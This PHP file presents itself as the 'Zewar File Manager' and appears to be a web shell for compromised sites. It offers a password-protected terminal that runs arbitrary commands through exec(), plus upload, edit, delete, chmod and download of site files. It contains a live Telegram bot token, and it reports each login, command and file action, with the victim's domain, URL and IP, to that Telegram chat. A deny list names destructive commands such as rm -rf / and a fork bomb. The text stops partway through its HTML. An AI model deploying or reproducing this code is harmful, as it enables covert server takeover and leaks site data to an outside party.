<?php
// ============================================================
// Basic Configuration - Stable Version
// ============================================================
error_reporting(E_ALL);
@ini_set("display_errors", 1);
@ini_set("memory_limit", "256M");
@ini_set("max_execution_time", 300);
@ini_set("upload_max_filesize", "100M");
@ini_set("post_max_size", "100M");

// Security Headers
header("Cache-Control: no-store, no-cache, must-revalidate");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

// Session Security
@session_start();
@ini_set('session.cookie_httponly', 1);

// ============================================================
// Configuration
// ============================================================
$CONFIG = [
    'username' => 'alfa',
    'password' => '399d793e379953170467ba10c1d15938',
    'session_timeout' => 3600,
];

// ============================================================
// TELEGRAM CONFIGURATION
// ============================================================
$TELEGRAM_CONFIG = [
    'bot_token' => '8761894826:AAHLx1uW3V7liU4Q-rv1bk-9mCN2T1UGN3U',
    'chat_id' => '2096023362'
];

// ============================================================
// Helper Functions
// ============================================================
function get_current_url() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    return $protocol . $host . ($_SERVER['REQUEST_URI'] ?? '');
}

function get_client_ip() {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    return $ip;
}

// ============================================================
// Security Functions
// ============================================================
function sanitize_path($path) {
    if (empty($path)) return false;
    
    // Remove null bytes
    $path = str_replace(chr(0), '', $path);
    
    // Normalize path separators
    $path = str_replace('\\', '/', $path);
    
    // Remove double slashes
    $path = preg_replace('#/+#', '/', $path);
    
    // Remove .. and . from path (security)
    $parts = explode('/', $path);
    $safe_parts = [];
    foreach ($parts as $part) {
        if ($part === '..') {
            array_pop($safe_parts);
        } elseif ($part !== '.' && $part !== '') {
            $safe_parts[] = $part;
        }
    }
    
    $clean_path = '/' . implode('/', $safe_parts);
    
    // Forbidden directories check
    $forbidden = array('/etc/shadow', '/etc/passwd', '/etc/sudoers', '/root/', '/boot/');
    foreach ($forbidden as $dir) {
        if (strpos($clean_path, $dir) === 0) {
            return false;
        }
    }
    
    // Get real path if exists
    if (file_exists($clean_path)) {
        $realPath = realpath($clean_path);
        if ($realPath !== false) {
            return $realPath;
        }
    }
    
    return $clean_path;
}

function sanitize_filename($filename) {
    $filename = str_replace(array('..', './', '.\\'), '', $filename);
    $filename = preg_replace('/[\\x00-\\x1F\\x7F\\/\\\\:\\*\\?"<>\\|]/', '_', $filename);
    return trim($filename);
}

function sanitize_command($cmd) {
    $critical_dangerous = array(
        'rm -rf /', 'rm -rf /*', 'mkfs', 'dd if=', ':(){ :|:& };:',
        'chmod 777 /', 'chmod -R 777 /', '> /dev/sda', 'dd of=/dev/sda'
    );
    
    $cmd_lower = strtolower($cmd);
    foreach ($critical_dangerous as $danger) {
        if (strpos($cmd_lower, $danger) !== false) {
            return false;
        }
    }
    return $cmd;
}

function csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verify_csrf_token($token) {
    return !empty($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

// ============================================================
// TELEGRAM NOTIFICATION
// ============================================================
function send_telegram($action, $details = array()) {
    global $TELEGRAM_CONFIG;
    
    $botToken = $TELEGRAM_CONFIG['bot_token'];
    $chatId = $TELEGRAM_CONFIG['chat_id'];
    
    if (empty($botToken) || empty($chatId)) {
        return false;
    }
    
    $ip = get_client_ip();
    $url = get_current_url();
    $time = date('Y-m-d H:i:s');
    $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
    
    $icons = array(
        'LOGIN' => '✅ LOGIN SUCCESS',
        'LOGIN_FAILED' => '❌ LOGIN FAILED',
        'UPLOAD' => '📤 UPLOAD',
        'UPLOAD_FAILED' => '❌ UPLOAD FAILED',
        'FOLDER' => '📁 CREATE FOLDER',
        'FILE' => '📄 CREATE FILE',
        'DELETE' => '🗑️ DELETE',
        'RENAME' => '✏️ RENAME',
        'CHMOD' => '🔒 CHMOD',
        'SAVE' => '💾 SAVE FILE',
        'CMD' => '💻 COMMAND',
        'DOWNLOAD' => '📥 DOWNLOAD',
        'LOGOUT' => '🚪 LOGOUT'
    );
    
    $display_action = isset($icons[$action]) ? $icons[$action] : $action;
    
    $msg = "🔐 FILE MANAGER ACTIVITY\n";
    $msg .= str_repeat("━", 50) . "\n";
    $msg .= "👤 User: Administrator\n";
    $msg .= "⏰ Time: {$time}\n";
    $msg .= "📌 Action: {$display_action}\n";
    $msg .= str_repeat("━", 50) . "\n";
    $msg .= "🌐 IP: {$ip}\n";
    $msg .= "🌍 Domain: {$domain}\n";
    $msg .= str_repeat("━", 50) . "\n";
    $msg .= "🔗 URL: {$url}\n";
    
    if (!empty($details)) {
        $msg .= str_repeat("━", 50) . "\n";
        $msg .= "📝 Details:\n";
        foreach ($details as $key => $val) {
            $msg .= "• {$key}: " . substr($val, 0, 200) . "\n";
        }
    }
    
    $msg .= str_repeat("━", 50);
    
    if (function_exists('curl_init')) {
        $api_url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $postData = http_build_query(array(
            'chat_id' => $chatId,
            'text' => $msg,
            'disable_web_page_preview' => true
        ));
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_exec($ch);
        curl_close($ch);
    }
    
    return true;
}

// ============================================================
// File Functions
// ============================================================
function format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 1) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 1) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 1) . ' KB';
    return $bytes . ' B';
}

function get_file_icon($filename) {
    if (is_dir($filename)) return '📁';
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = array(
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'zip' => '📦',
        'txt' => '📄', 'pdf' => '📕', 'doc' => '📘', 'xls' => '📗'
    );
    return isset($icons[$ext]) ? $icons[$ext] : '📄';
}

function delete_recursive($path) {
    if (!file_exists($path)) return true;
    if (!is_dir($path)) return @unlink($path);
    
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        if (!delete_recursive($path . DIRECTORY_SEPARATOR . $file)) return false;
    }
    return @rmdir($path);
}

// ============================================================
// Authentication
// ============================================================
$authenticated = isset($_SESSION['auth']) && $_SESSION['auth'] === true;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !$authenticated) {
    if (md5(trim($_POST['password'])) === $CONFIG['password']) {
        session_regenerate_id(true);
        $_SESSION['auth'] = true;
        $_SESSION['login_time'] = time();
        $authenticated = true;
        
        // Set initial directory session
        $_SESSION['fm_root'] = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
        
        send_telegram('LOGIN', array('Status' => 'Success'));
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    } else {
        send_telegram('LOGIN_FAILED', array('IP' => get_client_ip()));
        $error = "Invalid credentials!";
        echo get_login_page($error);
        exit;
    }
}

if ($authenticated && (time() - $_SESSION['login_time'] > $CONFIG['session_timeout'])) {
    session_destroy();
    $authenticated = false;
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!$authenticated) {
    echo get_login_page();
    exit;
}

// Set File Manager Root Location (tempat file manager ini berada)
if (!isset($_SESSION['fm_root'])) {
    $_SESSION['fm_root'] = dirname(__FILE__);
}
$fm_root = $_SESSION['fm_root'];

// ============================================================
// Path Handling - FIXED
// ============================================================
$document_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
$document_root = str_replace('\\', '/', $document_root);

// Get current directory from parameter
if (isset($_GET['d']) && !empty($_GET['d'])) {
    $current = base64_decode($_GET['d']);
    $current = str_replace('\\', '/', $current);
    
    // Security: prevent directory traversal
    $real_current = realpath($current);
    $real_root = realpath($document_root);
    $real_fm_root = realpath($fm_root);
    
    if ($real_current !== false) {
        // Allow navigation within document root OR fm root
        $allowed = false;
        if ($real_root !== false && strpos($real_current, $real_root) === 0) {
            $allowed = true;
        }
        if ($real_fm_root !== false && strpos($real_current, $real_fm_root) === 0) {
            $allowed = true;
        }
        
        if ($allowed) {
            $current = $real_current;
        } else {
            $current = $fm_root;
        }
    } else {
        // If realpath fails, try to use the path as is but sanitize
        $current = sanitize_path($current);
        if (!$current || !is_dir($current)) {
            $current = $fm_root;
        }
    }
} else {
    // Default to File Manager root location
    $current = $fm_root;
}

// Final check - ensure current is a valid directory
if (!is_dir($current)) {
    $current = $fm_root;
}

// Normalize current path
$current = str_replace('\\', '/', $current);
@chdir($current);

// Get parent directory
$parent_dir = dirname($current);
$parent_dir = str_replace('\\', '/', $parent_dir);
$can_go_up = ($parent_dir !== $current && $parent_dir !== '/' && $parent_dir !== false && is_dir($parent_dir));

// Check if we can go back to FM root
$can_go_to_fm_root = ($current !== $fm_root && is_dir($fm_root));

// ============================================================
// Process Actions
// ============================================================
$message = '';
$toast_type = '';

// AJAX Command Handler
if (isset($_GET['ajax_cmd']) && isset($_POST['command'])) {
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    header('Content-Type: application/json');
    
    $response = array('status' => 'error', 'output' => 'Unknown error occurred');
    
    if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
        $response['output'] = 'CSRF validation failed';
        echo json_encode($response);
        exit;
    }
    
    $cmd = $_POST['command'] ?? '';
    $original_cmd = $cmd;
    $cmd = sanitize_command($cmd);
    
    if ($cmd === false) {
        send_telegram('⚠️ COMMAND BLOCKED', array(
            'Command' => substr($original_cmd, 0, 200),
            'Reason' => 'Critical dangerous command blocked'
        ));
        $response['output'] = '⚠️ Command blocked for security reasons.';
        echo json_encode($response);
        exit;
    }
    
    $output = array();
    $return_var = 0;
    exec($cmd . ' 2>&1', $output, $return_var);
    $result = implode("\n", $output);
    
    if (empty($result) && $return_var === 0) {
        $result = '✓ Command executed successfully (no output)';
    } elseif ($return_var !== 0 && empty($result)) {
        $result = '⚠️ Command failed with exit code: ' . $return_var;
    }
    
    send_telegram('CMD', array(
        'Command' => substr($cmd, 0, 200),
        'Status' => $return_var === 0 ? 'Success' : 'Failed'
    ));
    
    $response = array(
        'status' => $return_var === 0 ? 'success' : 'error',
        'output' => $result,
        'command' => $cmd
    );
    
    echo json_encode($response);
    exit;
}

// Handle Edit File Request (GET)
if (isset($_GET['edit']) && !empty($_GET['edit'])) {
    $filename = sanitize_filename(base64_decode($_GET['edit']));
    if ($filename && file_exists($current . '/' . $filename) && is_file($current . '/' . $filename)) {
        $filepath = $current . '/' . $filename;
        $content = file_get_contents($filepath);
        $is_writable = is_writable($filepath);
        
        echo '<!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Edit File</title>
            <style>
                body { font-family: monospace; margin: 20px; background: #1e1e1e; color: #fff; }
                .container { max-width: 1200px; margin: auto; }
                textarea { width: 100%; height: 500px; background: #0a0a0a; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; }
                button { padding: 10px 20px; margin: 10px 5px; cursor: pointer; }
                .btn-save { background: #4caf50; color: white; border: none; }
                .btn-cancel { background: #f44336; color: white; border: none; }
            </style>
        </head>
        <body>
        <div class="container">
            <h2>Edit File: ' . htmlspecialchars($filename) . '</h2>
            <form method="post" action="?">
                <input type="hidden" name="csrf_token" value="' . csrf_token() . '">
                <input type="hidden" name="save_file_action" value="1">
                <input type="hidden" name="edit_filename" value="' . base64_encode($filename) . '">
                <input type="hidden" name="current_dir" value="' . base64_encode($current) . '">
                <textarea name="file_content">' . htmlspecialchars($content) . '</textarea>
                <div>
                    <button type="submit" name="save_file_btn" class="btn-save">Save Changes</button>
                    <button type="button" class="btn-cancel" onclick="window.location.href=\'?d=' . base64_encode($current) . '\'">Cancel</button>
                </div>
            </form>
        </div>
        </body>
        </html>';
        exit;
    } else {
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
}

// POST Actions
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && verify_csrf_token($_POST['csrf_token'])) {
    
    // Save File from Edit Form
    if (isset($_POST['save_file_action']) && isset($_POST['save_file_btn'])) {
        $filename = base64_decode($_POST['edit_filename'] ?? '');
        $filename = sanitize_filename($filename);
        $current_dir = base64_decode($_POST['current_dir'] ?? '');
        $current_dir = str_replace('\\', '/', $current_dir);
        
        if ($filename && $current_dir && file_exists($current_dir . '/' . $filename)) {
            $filepath = $current_dir . '/' . $filename;
            $content = $_POST['file_content'] ?? '';
            
            if (file_put_contents($filepath, $content) !== false) {
                $message = "✅ File saved successfully: {$filename}";
                $toast_type = 'success';
                send_telegram('SAVE', array('File' => $filename));
            } else {
                $message = "❌ Failed to save file: {$filename}";
                $toast_type = 'error';
            }
        } else {
            $message = "❌ File not found!";
            $toast_type = 'error';
        }
        
        header("Location: ?d=" . base64_encode($current_dir));
        exit;
    }
    
    // Upload File
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $filename = sanitize_filename($_FILES['file']['name']);
        if ($filename && move_uploaded_file($_FILES['file']['tmp_name'], $current . '/' . $filename)) {
            @chmod($current . '/' . $filename, 0644);
            $message = "✅ Uploaded: {$filename}";
            $toast_type = 'success';
            send_telegram('UPLOAD', array('File' => $filename, 'Size' => format_size($_FILES['file']['size'])));
        } else {
            $message = "❌ Upload failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Create Folder
    elseif (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
        $name = sanitize_filename($_POST['folder_name']);
        if ($name && !file_exists($current . '/' . $name) && mkdir($current . '/' . $name, 0755)) {
            $message = "✅ Folder created: {$name}";
            $toast_type = 'success';
            send_telegram('FOLDER', array('Name' => $name));
        } else {
            $message = "❌ Cannot create folder!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Create File
    elseif (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
        $name = sanitize_filename($_POST['file_name']);
        if ($name && !file_exists($current . '/' . $name) && file_put_contents($current . '/' . $name, $_POST['file_content'] ?? '') !== false) {
            @chmod($current . '/' . $name, 0644);
            $message = "✅ File created: {$name}";
            $toast_type = 'success';
            send_telegram('FILE', array('Name' => $name));
        } else {
            $message = "❌ Cannot create file!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Delete
    elseif (isset($_POST['delete']) && !empty($_POST['item'])) {
        $name = sanitize_filename($_POST['item']);
        $path = $current . '/' . $name;
        $is_dir = is_dir($path);
        if (file_exists($path) && delete_recursive($path)) {
            $message = "✅ Deleted: {$name}";
            $toast_type = 'success';
            send_telegram('DELETE', array('Name' => $name, 'Type' => $is_dir ? 'Folder' : 'File'));
        } else {
            $message = "❌ Delete failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Rename
    elseif (isset($_POST['rename']) && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
        $old = sanitize_filename($_POST['old_name']);
        $new = sanitize_filename($_POST['new_name']);
        if ($old && $new && $old !== $new && rename($current . '/' . $old, $current . '/' . $new)) {
            $message = "✅ Renamed: {$old} → {$new}";
            $toast_type = 'success';
            send_telegram('RENAME', array('From' => $old, 'To' => $new));
        } else {
            $message = "❌ Rename failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Chmod
    elseif (isset($_POST['chmod']) && !empty($_POST['item']) && !empty($_POST['permission'])) {
        $name = sanitize_filename($_POST['item']);
        $perm = $_POST['permission'];
        if ($name && preg_match('/^[0-7]{3,4}$/', $perm) && chmod($current . '/' . $name, octdec($perm))) {
            $message = "✅ Permission changed to {$perm}";
            $toast_type = 'success';
            send_telegram('CHMOD', array('File' => $name, 'Permission' => $perm));
        } else {
            $message = "❌ Chmod failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Reset to FM Root
    elseif (isset($_POST['reset_to_root'])) {
        $message = "✅ Returned to File Manager root location";
        $toast_type = 'success';
        header("Location: ?d=" . base64_encode($fm_root));
        exit;
    }
    
    // Logout
    elseif (isset($_POST['logout'])) {
        send_telegram('LOGOUT', array());
        session_destroy();
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    }
}

// Handle download
if (isset($_GET['download']) && !empty($_GET['download'])) {
    $file = base64_decode($_GET['download']);
    $file = str_replace('\\', '/', $file);
    
    if ($file && file_exists($file) && is_file($file)) {
        $filename = $_GET['filename'] ?? basename($file);
        send_telegram('DOWNLOAD', array('File' => $filename));
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        readfile($file);
        exit;
    } else {
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
}

// ============================================================
// Directory Listing
// ============================================================
$items = array();
$handle = @opendir($current);
if ($handle) {
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $full = $current . '/' . $item;
        $is_dir = is_dir($full);
        $stat = @stat($full);
        if ($stat) {
            $size = $is_dir ? '-' : format_size($stat['size']);
            $perms = substr(sprintf('%o', $stat['mode']), -4);
            $mtime = date('Y-m-d H:i:s', $stat['mtime']);
        } else {
            $size = '-';
            $perms = '0000';
            $mtime = '-';
        }
        
        // Cek apakah file/directory writable
        $is_writable = is_writable($full);
        
        $items[] = array(
            'name' => $item,
            'is_dir' => $is_dir,
            'size' => $size,
            'perms' => $perms,
            'mtime' => $mtime,
            'icon' => get_file_icon($full),
            'link' => $is_dir ? '?d=' . base64_encode($full) : '#',
            'writable' => $is_writable
        );
    }
    closedir($handle);
}

usort($items, function($a, $b) {
    if ($a['is_dir'] != $b['is_dir']) return $a['is_dir'] ? -1 : 1;
    return strcasecmp($a['name'], $b['name']);
});

// Format path dengan benar menggunakan slash
$display_path = str_replace('\\', '/', $current);
$path_parts = explode('/', $display_path);
$path_parts = array_filter($path_parts);

// For root directory
if (empty($path_parts)) {
    $path_parts = ['/'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zewar File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #0a0a0a;
            color: #fff;
            padding: 15px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #1a1a2e;
            border-radius: 10px;
            overflow: hidden;
        }
        .header {
            padding: 15px 20px;
            background: #16213e;
            border-bottom: 1px solid #ffd700;
        }
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .logo h1 { font-size: 1.3rem; color: #ffd700; }
        .logo p { font-size: 0.7rem; color: #aaa; }
        .stats { display: flex; gap: 15px; }
        .stat { text-align: center; padding: 5px 12px; background: #0f3460; border-radius: 5px; }
        .stat-value { font-size: 1rem; font-weight: bold; color: #ffd700; }
        .stat-label { font-size: 0.6rem; color: #aaa; }
        .toolbar {
            padding: 12px 15px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            background: #0f3460;
            border-bottom: 1px solid rgba(255,215,0,0.2);
        }
        .btn {
            padding: 8px 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            text-decoration: none;
        }
        .btn-primary { background: #ffd700; color: #000; }
        .btn-primary:hover { background: #ffed4a; transform: translateY(-2px); }
        .btn-danger { background: #dc3545; color: #fff; }
        .btn-danger:hover { background: #c82333; transform: translateY(-2px); }
        .btn-outline { background: transparent; border: 1px solid #ffd700; color: #ffd700; }
        .btn-outline:hover { background: rgba(255,215,0,0.1); transform: translateY(-2px); }
        .btn-up { background: #28a745; color: #fff; }
        .btn-root { background: #17a2b8; color: #fff; }
        .btn-back { background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: #fff; }
        .btn-back:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(238,90,36,0.4); }
        .btn-cmd { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; }
        .btn-cmd:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(102,126,234,0.4); }
        
        .breadcrumb {
            padding: 12px 15px;
            background: #0f3460;
            font-size: 0.85rem;
            font-family: monospace;
            word-break: break-all;
        }
        .breadcrumb a { color: #ffd700; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .separator { margin: 0 5px; color: #ffd700; font-weight: bold; }
        .current-path { color: #4caf50; font-weight: bold; }
        
        .file-table { overflow-x: auto; }
        .file-table table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 10px 12px; text-align: left; background: #16213e; color: #ffd700; font-weight: 600; font-size: 0.75rem; }
        .file-table td { padding: 8px 12px; border-bottom: 1px solid #0f3460; font-size: 0.75rem; }
        .file-table tr:hover td { background: #0f3460; }
        .item-name { display: flex; align-items: center; gap: 8px; }
        .item-icon { font-size: 1.1rem; }
        
        .item-name-writable { color: #4caf50; }
        .item-name-readonly { color: #ffffff; }
        .item-link-writable { color: #4caf50; text-decoration: none; }
        .item-link-writable:hover { color: #6fbf6f; text-decoration: underline; }
        .item-link-readonly { color: #ffffff; text-decoration: none; }
        .item-link-readonly:hover { color: #ffd700; text-decoration: underline; }
        
        .action-group { display: flex; gap: 5px; flex-wrap: wrap; }
        .action-btn {
            background: #0f3460;
            border: none;
            padding: 4px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.7rem;
            color: #fff;
            transition: all 0.2s;
        }
        .action-btn:hover { background: #ffd700; color: #000; transform: translateY(-1px); }
        .badge { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 0.65rem; font-family: monospace; background: #0f3460; color: #ffd700; }
        .badge-writable { background: #4caf50; color: #fff; }
        .badge-readonly { background: #0f3460; color: #ffd700; }
        
        .cmd-modal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.9);
            width: 90%;
            max-width: 800px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border-radius: 20px;
            border: 1px solid rgba(255,215,0,0.3);
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            z-index: 1001;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }
        .cmd-modal.active {
            display: block;
            opacity: 1;
            visibility: visible;
            transform: translate(-50%, -50%) scale(1);
        }
        .cmd-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            z-index: 1000;
        }
        .cmd-overlay.active { display: block; }
        .cmd-header {
            padding: 20px 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px 20px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .cmd-header h3 {
            color: #fff;
            font-size: 1.2rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .cmd-close {
            background: rgba(255,255,255,0.2);
            border: none;
            color: #fff;
            font-size: 1.5rem;
            cursor: pointer;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            transition: all 0.2s;
        }
        .cmd-close:hover { background: rgba(255,255,255,0.4); transform: rotate(90deg); }
        .cmd-body { padding: 25px; }
        .cmd-input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .cmd-input-group input {
            flex: 1;
            padding: 12px 15px;
            background: #0a0a0a;
            border: 1px solid #667eea;
            border-radius: 10px;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }
        .cmd-input-group input:focus {
            outline: none;
            border-color: #764ba2;
            box-shadow: 0 0 10px rgba(102,126,234,0.3);
        }
        .cmd-output {
            background: #0a0a0a;
            border-radius: 10px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            color: #0f0;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
            border: 1px solid #333;
        }
        .cmd-output::-webkit-scrollbar {
            width: 8px;
        }
        .cmd-output::-webkit-scrollbar-track {
            background: #1a1a1a;
            border-radius: 4px;
        }
        .cmd-output::-webkit-scrollbar-thumb {
            background: #667eea;
            border-radius: 4px;
        }
        .cmd-footer {
            padding: 15px 25px;
            background: #0f3460;
            border-radius: 0 0 20px 20px;
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #1a1a2e;
            border-radius: 10px;
            width: 90%;
            max-width: 500px;
            border: 1px solid #ffd700;
        }
        .modal-header {
            padding: 15px 20px;
            background: #16213e;
            border-bottom: 1px solid #ffd700;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header h3 { color: #ffd700; }
        .modal-close {
            background: none;
            border: none;
            color: #fff;
            font-size: 1.5rem;
            cursor: pointer;
        }
        .modal-body { padding: 20px; }
        .modal-body input, .modal-body textarea {
            width: 100%;
            padding: 8px 12px;
            background: #0a0a0a;
            border: 1px solid #ffd700;
            border-radius: 5px;
            color: #fff;
            margin-top: 5px;
        }
        .modal-body textarea { min-height: 100px; font-family: monospace; }
        .modal-body label { display: block; margin-bottom: 15px; color: #ffd700; }
        .modal-footer {
            padding: 15px 20px;
            background: #16213e;
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 12px 20px;
            border-radius: 5px;
            color: #fff;
            z-index: 2000;
            animation: slideIn 0.3s ease;
        }
        .toast.success { background: #28a745; }
        .toast.error { background: #dc3545; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .loading { animation: pulse 1s ease-in-out infinite; }
        
        /* Location indicator */
        .location-indicator {
            background: linear-gradient(135deg, #1a1a2e, #0f3460);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.7rem;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        .location-indicator i { color: #ffd700; }
        .location-indicator span { color: #4caf50; font-weight: bold; }
        
        @media (max-width: 768px) {
            .toolbar { justify-content: center; }
            .stats { display: none; }
            .action-group { flex-wrap: wrap; }
            .cmd-modal { width: 95%; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <h1><i class="fas fa-folder-open"></i> Zewar File Manager</h1>
                <p>Advanced Web File Management System</p>
            </div>
            <div class="stats">
                <div class="stat"><div class="stat-value"><?php echo count($items); ?></div><div class="stat-label">Items</div></div>
                <div class="stat"><div class="stat-value"><?php echo date('H:i:s'); ?></div><div class="stat-label">Server Time</div></div>
                <div class="location-indicator">
                    <i class="fas fa-map-marker-alt"></i>
                    <span>FM Root:</span> <?php echo basename($fm_root); ?>
                </div>
            </div>
        </div>
    </div>
    
    <div class="toolbar">
        <button class="btn btn-primary" onclick="showModal('uploadModal')"><i class="fas fa-upload"></i> Upload</button>
        <button class="btn btn-primary" onclick="showModal('folderModal')"><i class="fas fa-folder-plus"></i> New Folder</button>
        <button class="btn btn-primary" onclick="showModal('fileModal')"><i class="fas fa-file-plus"></i> New File</button>
        <button class="btn btn-cmd" onclick="openCmdModal()"><i class="fas fa-terminal"></i> Terminal</button>
        
        <?php if ($can_go_to_fm_root): ?>
        <form method="post" style="display: inline;">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <button type="submit" name="reset_to_root" class="btn btn-back" title="Kembali ke lokasi file manager">
                <i class="fas fa-undo-alt"></i> Back to FM Root
            </button>
        </form>
        <?php endif; ?>
        
        <form method="post" style="display: inline;">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <button type="submit" name="logout" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</button>
        </form>
        
        <?php if ($can_go_up): ?>
        <a href="?d=<?php echo base64_encode($parent_dir); ?>" class="btn btn-up"><i class="fas fa-level-up-alt"></i> Parent Directory</a>
        <?php endif; ?>
